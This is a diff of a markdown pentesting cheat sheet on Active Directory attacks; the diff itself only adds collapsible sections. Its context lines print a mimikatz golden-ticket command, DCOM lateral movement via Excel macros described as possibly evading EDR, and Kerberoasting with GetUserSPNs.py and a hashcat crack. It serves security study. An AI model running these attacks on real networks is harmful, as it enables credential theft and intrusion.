@@ -771,6 +771,10 @@ mimikatz # kerberos::golden /user:user /domain:domain.com /sid:s-1-5-21-16028755
 where /rc4 is the hash
 
 ## Lateral Movement with Distributed Component Object Model (DCOM) 
+
+<details>
+  <summary>Expand</summary>
+
 i: Requires access to TCP 135 for DCOM and TCP 445 for SMB. Relatively new vector. May avoid some detection system like EDR/NDR/AV.
 
 The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.
@@ -821,6 +825,7 @@ $Workbook = $com.Workbooks.Open("C:\myexcel.xls")
 
 $com.Run("mymacro")
 ```
+</details>
 
 
 ## Token Impersonation
@@ -848,6 +853,9 @@ User->Application Server: 5. Presents TGS for service enc. w. servers account
 Application Server->Domain Controller: (opt.) PAC Validation request
 Domain Controller->Application Server: (opt.) PAC Validation response
 ```
+
+<details>
+  <summary>Expand</summary>
 
 **Get Kerberos Service Ticket by SPN:**
 When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name. These checks are performed as a second step only when connecting to the service itself. This means that if we know the SPN we want to target, we can request a service ticket for it from the domain controller. Then, since it is our own ticket, we can extract it from local memory and save it to disk.
@@ -899,6 +907,7 @@ hashcat -m 13100 --force hash.hash /usr/share/wordlists/rockyou.txt
 ```
 GetUserSPNs.py whiterose.local/ealderson:Password123 -dc-ip 192.168.92.130 -request
 ```
+</details>
 
 ## cPassword / Group Policy Preferences (GPP) Attacks
 
